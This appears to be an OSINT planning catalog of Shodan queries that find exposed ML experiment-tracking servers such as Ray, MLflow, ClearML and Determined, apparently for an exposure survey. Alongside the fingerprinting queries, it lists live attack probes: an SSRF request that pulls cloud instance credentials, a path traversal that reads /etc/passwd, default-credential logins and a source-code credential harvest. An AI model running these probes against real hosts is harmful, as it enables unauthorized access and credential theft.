# ML Experiment Tracking — Shodan Query Catalog
_Generated: 2026-05-27 from pre-survey OSINT pass (12 platforms + MLflow supplement)_
_See: data/platform-intel/experiment-tracking-osint-2026-05-27.md for full intel_

---

## Ray Dashboard (Ray Tune)
**Auth default:** off (no auth layer; explicitly documented)
**Exposure class:** Full cluster read/write; RCE chain via CVE-2023-48022/23/6021; IAM credential harvest via SSRF; SSH key disclosure via path traversal

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.html:"ray dashboard" port:8265` | Branded phrase in served HTML; 54 confirmed hits per existing catalog | Low |
| secondary | `port:8265 http.html:"ray"` | Broader catch for instances with non-standard HTML | Med |
| title-match | `http.title:"Ray Dashboard"` | Title string; may differ across Ray versions | Low |
| identity-probe | `GET /api/jobs/` → JSON job list | CVE-2023-48022 surface; unauthenticated job enumeration | — |
| ssrf-probe | `GET /log_proxy?url=http://169.254.169.254/` | CVE-2023-48023; returns AWS IMDSv1 creds on cloud instances | — |
| traversal-probe | `GET /nodes?view=summary` then `GET /api/v0/logs/file?node_id=<id>&filename=../../etc/passwd` | CVE-2023-6021 chain | — |

**NOTE:** ShadowRay (CVE-2023-48022) is actively exploited. Any instance on the public internet is a high-priority finding regardless of Ray version — auth remains unsupported upstream.

---

## MLflow Tracking Server
**Auth default:** off (no auth, no encryption by default)
**Exposure class:** All experiments, model artifacts, registered models; RCE via CVE-2025-11201 (no auth required); API keys often stored as run tags

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"MLflow" port:5000` | Branded title on default port | Low |
| secondary | `http.html:"mlflow" port:5000` | HTML body match; catches non-title instances | Med |
| broad | `http.title:"MLflow"` | Port-agnostic; some deployments use 5001, 5555 | Low |
| api-confirm | `http.html:"/api/2.0/mlflow"` | API path in page source/docs confirms identity | Low |
| identity-probe | `GET /api/2.0/mlflow/experiments/list` → `{"experiments":[...]}` | Unauthenticated list of all experiments | — |
| rce-surface | `POST /api/2.0/mlflow/model-versions/create` with `source` traversal | CVE-2025-11201; no auth required | — |

---

## ClearML Self-Hosted
**Auth default:** off (ships with "free access" login; explicit opt-in required for auth)
**Exposure class:** Full experiment metadata, training artifacts, model files (via port 8081 file server), pipeline configs, default API keys

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"ClearML" port:8080` | Branded UI title; confirmed 112 hits in existing catalog | Low |
| secondary | `port:8008 http.html:"clearml"` | API server port with branded HTML — very distinctive combination | Low |
| file-server | `port:8081 http.html:"clearml"` | File server with ClearML branding; artifact access | Low |
| bare | `"clearml"` | Banner match regardless of port; 170 hits in existing catalog | Med |
| identity-probe | `GET /api/v2.*/system.company_info` on port 8008 → `company_name` field | Confirms ClearML API server; version in response | — |
| auth-check | `GET /auth.login` with default `Basic <base64(default_key:default_secret)>` | Checks for unrotated default credentials | — |

---

## Determined.ai
**Auth default:** default-creds (admin with blank password — documented default)
**Exposure class:** Distributed training jobs, model checkpoints, GPU cluster config, SSH keys, notebook contents, cloud storage credentials

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"Determined" port:8080` | Branded title; 60 confirmed hits in existing catalog | Low |
| secondary | `http.html:"Determined" port:8080` | HTML body match; catches login page variants | Med |
| api-confirm | `port:8080 http.html:"det" http.html:"experiment"` | API-specific terms in HTML | Med |
| identity-probe | `POST /api/v1/auth/login {"username":"admin","password":""}` → 200 + `token` | Confirms admin/blank-password; live finding | — |
| experiment-enum | `GET /api/v1/experiments` with obtained token → full experiment list | Post-auth enumeration | — |

---

## Aim
**Auth default:** off (no authentication mechanism exists in the default install)
**Exposure class:** All experiment runs and metrics, training code snapshots, hyperparameters, system metrics (CPU/GPU/memory), custom metadata objects

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `port:43800 http.html:"aim"` | Highly distinctive port; almost nothing else uses 43800 | Low |
| secondary | `port:43800` | Port alone is a strong signal; narrow with HTML confirm | Low |
| title-match | `http.title:"Aim" port:43800` | Title string for Aim UI | Low |
| tracking-server | `port:53800` | Remote tracking server port; accepts arbitrary metric writes | Low |
| identity-probe | `GET /api/projects` → JSON with `name` field | Unauthenticated project enumeration | — |
| runs-probe | `GET /api/runs/search/run` → run objects with full metadata | Full run access; no token required | — |

---

## Sacred + Omniboard
**Auth default:** off (no auth; widely documented as exposed; source code captured at run time)
**Exposure class:** Experiment source code (with hardcoded creds), hyperparameters, metrics, MongoDB connection strings, model artifacts

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"Omniboard" port:9000` | Exact title match on distinctive port | Low |
| secondary | `port:9000 http.html:"omniboard"` | HTML body; catches non-default title deployments | Low |
| bare | `http.html:"omniboard"` | Port-agnostic; catches non-9000 deployments | Med |
| mongodb-colocated | `port:27017 "sacred"` | MongoDB with sacred database name; direct DB access | Low |
| identity-probe | `GET /api/v1/Runs` → JSON run list with `source_files` array | Unauthenticated; source code in response | — |
| cred-harvest | `GET /api/v1/Runs?select=source_files` | Source snapshots often contain hardcoded credentials | — |

---

## Comet ML Self-Hosted
**Auth default:** default-creds (`admin:admin` on versions < 24.9.8; MD5-hashed passwords)
**Exposure class:** Experiment runs, model evaluation data, API keys in user profiles, code snapshots, hyperparameters

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"Comet" port:5000` | Branded title on default port | Med (generic title) |
| secondary | `http.html:"comet-ml" port:5000` | Library name in HTML narrows significantly | Low |
| api-confirm | `port:5000 http.html:"/api/v2/experiment"` | API path in page source | Low |
| identity-probe | `GET /healthcheck` → `{"status":"ok"}` | Lightweight presence confirmation | — |
| auth-check | `POST /api/v2/auth` with `admin:admin` | Checks for unrotated default credentials | — |

---

## Optuna Dashboard
**Auth default:** off (no auth; default host is localhost but containers often bind 0.0.0.0)
**Exposure class:** HPO study configs, all trial hyperparameters and objective values, best parameters, optimization history

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"Optuna Dashboard" port:8080` | Exact title; distinctive | Low |
| secondary | `http.html:"optuna" port:8080` | Library name in HTML | Med |
| bare | `http.title:"Optuna Dashboard"` | Port-agnostic catch | Low |
| identity-probe | `GET /api/studies` → JSON array with `study_name`, `directions`, `n_trials` | Unauthenticated study enumeration | — |
| trial-enum | `GET /api/studies/<study_id>/trials` → full trial history with all hyperparameter values | Complete HPO data access | — |

---

## Weights & Biases (W&B Local)
**Auth default:** on (API key required; not a default-open target)
**Exposure class:** Experiment runs, model artifacts, training configs (only if auth bypassed or misconfigured)

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.title:"Weights & Biases" port:8080` | Branded title | Low |
| secondary | `http.html:"wandb" port:8080` | JS/HTML reference to wandb on default port | Med |
| docker-image | `http.html:"wandb/local"` | Docker image reference may appear in setup pages | Med |
| identity-probe | `GET /api/v1/users/me` with invalid token → 401 with `{"error":"Unauthorized"}` | Confirms W&B API; auth failure response is distinctive | — |

---

## Neptune.ai Self-Hosted
**Auth default:** on (Keycloak; enterprise only)
**Exposure class:** Low — auth required; Keycloak misconfiguration is the edge case

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.html:"neptune" port:30080` | Distinctive port + brand | Low |
| secondary | `http.title:"Neptune" port:30080` | NodePort-specific title match | Low |
| keycloak-colocated | `port:30080 http.html:"keycloak"` | Keycloak login page on same port indicates Neptune identity management | Low |
| identity-probe | `GET /auth/` → Keycloak login page with Neptune branding | Confirms self-hosted Neptune instance | — |

---

## DVC Studio Self-Hosted
**Auth default:** on (OAuth required; Helm-provisioned)
**Exposure class:** Low — OAuth gates access; misconfiguration-class risk only

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.html:"iterative" http.html:"studio"` | Both brand markers in HTML | Med |
| secondary | `http.title:"Studio" http.html:"dvc"` | DVC Studio-specific combination | Med |
| identity-probe | `GET /api/user` → OAuth redirect confirms Studio presence | Auth redirect confirms identity | — |

---

## SigOpt Self-Hosted
**Auth default:** on (enterprise provisioned)
**Exposure class:** Low — enterprise product, auth enforced; near-zero expected population

| Label | Query | Rationale | FP Risk |
|-------|-------|-----------|---------|
| primary | `http.html:"sigopt"` | Brand name in HTML | Low |
| secondary | `http.title:"SigOpt"` | Exact title match | Low |
| identity-probe | `GET /api/v1/experiments` → 401 with SigOpt error schema | Auth failure response confirms API | — |

---

## Guild AI
**Auth default:** N/A — local CLI only, no network server
**Notes:** Not a Shodan survey target. No queries applicable.

---

## Priority Queue for Survey Execution

1. **Ray Dashboard** — CVE-2023-48022 active exploitation; RCE + IAM harvest chain
2. **MLflow** — CVE-2025-11201 RCE (no auth required); widest deployment footprint
3. **ClearML** — auth-off-by-default; high artifact exposure; 112-170 confirmed hits already cataloged
4. **Determined.ai** — admin/blank-password on GPU cluster; 60 confirmed hits; high-value target
5. **Aim** — no auth, distinctive port 43800; full training data exposure
6. **Sacred/Omniboard** — no auth; source code with hardcoded creds; CVE-2025-14847 backend
7. **Comet ML** — default admin:admin; older deployments not patched
8. **Optuna Dashboard** — no auth when containerized; HPO secrets exposure
9. **W&B Local** — auth on but worth confirming population size
10. **Neptune.ai** — auth enforced; low priority
11. **DVC Studio** — auth enforced; low priority
12. **SigOpt** — enterprise, near-zero population; lowest priority
